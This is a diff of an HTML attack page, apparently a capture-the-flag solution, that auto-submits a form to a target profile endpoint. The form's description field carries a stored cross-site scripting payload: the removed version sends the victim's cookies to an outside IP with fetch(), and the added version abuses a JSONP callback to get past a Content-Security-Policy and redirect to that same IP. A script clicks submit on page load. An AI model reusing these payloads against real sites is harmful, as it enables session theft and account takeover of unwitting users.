@@ -1,26 +1,20 @@
-
-<!DOCTYPE html>
-<html lang="en">
-  <head>
+<html lang="en"><head>
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>goodestofdoggos</title>
+    <title>definitely not an XXE challenge</title>
 
-    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" integrity="sha384-WskhaSGFgHYWDcbwN70/dfYBj47jz9qbsMId/iRN3ewGhXQFZCSftd1LZCfmhktB" crossorigin="anonymous">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; font-src 'self' https://fonts.gstatic.com; frame-src 'self'; img-src 'self' *; manifest-src 'self'; media-src 'self'; object-src 'self';style-src 'self'  'sha256-Htiv/OVCW69PcbprzFooRH98lguPpcPU7Nw5x0YdQ0g=' ; script-src 'self' 'sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49' 'sha384-smHYKdLADwkXOn1EmN1qk/HfnUcbVRZyYmZ4qpPea6sjB/pTJ0euyQp0Mk8ck+5T' 'sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo'">
     <style>
         hr { border-color: #cccccc; margin: 0; }
         .no-margins { margin: 0px; }
         .with-margins { margin: 10px; }
         .col-centered { float: none; margin: 0 auto; }
     </style>
-    <script>
-      function hack(){
-        document.getElementById("toHack").click();
-      }
-    </script>
-    <link href="https://fonts.googleapis.com/css?family=Playfair+Display:700,900" rel="stylesheet">
+
     <link href="/static/styles.css" rel="stylesheet">
+    <link href="/static/font.css" rel="stylesheet">
+    <link href="/static/bootstrap.css" rel="stylesheet">
   </head>
 
   <body>
@@ -44,22 +38,24 @@
     </div>
 
     <div id="main-div" class="container mb-3">
-
-
-
+    
+    
+    
     </div>
 
     <main role="main" class="container mb-5">
-
+    
 
 <h1>Profile:</h1>
-<p>Username: zest</p>
-<form method="POST" action="http://chain.demo.ns.agency/profile">
+<p>Username: zest3</p>
+<form method="POST">
   <div class="form-group">
     <label for="exampleFormControlTextarea1">Description</label>
-    <input type="text" class="form-control" name="description" value='</textarea><script> fetch("http://35.180.29.78/log/"+document.cookie)</script>'>
+
+    <input type="text" class="form-control" name="description" rows="3" value="</textarea><script src=\"/user-list?format=jsonp&callback=window['location']['replace']('http://35\x2E180\x2E29\x2E78:6969/test'),alert_\"></script>"></input>
+
   </div>
-  <input id="toHack" type="submit" class="btn btn-primary mb-2" value="Update"/>
+  <input type="submit" class="btn btn-primary mb-2" value="Update" id="hack">
 </form>
 
 
@@ -76,8 +72,8 @@
     ================================================== -->
     <!-- Placed at the end of the document so the pages load faster -->
     <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+    <script src="/user-list?format=json"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
     <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js" integrity="sha384-smHYKdLADwkXOn1EmN1qk/HfnUcbVRZyYmZ4qpPea6sjB/pTJ0euyQp0Mk8ck+5T" crossorigin="anonymous"></script>
-    <script> hack() </script>
-  </body>
-</html>
+    <script> document.getElementById('hack').click() </script>
+</body></html>
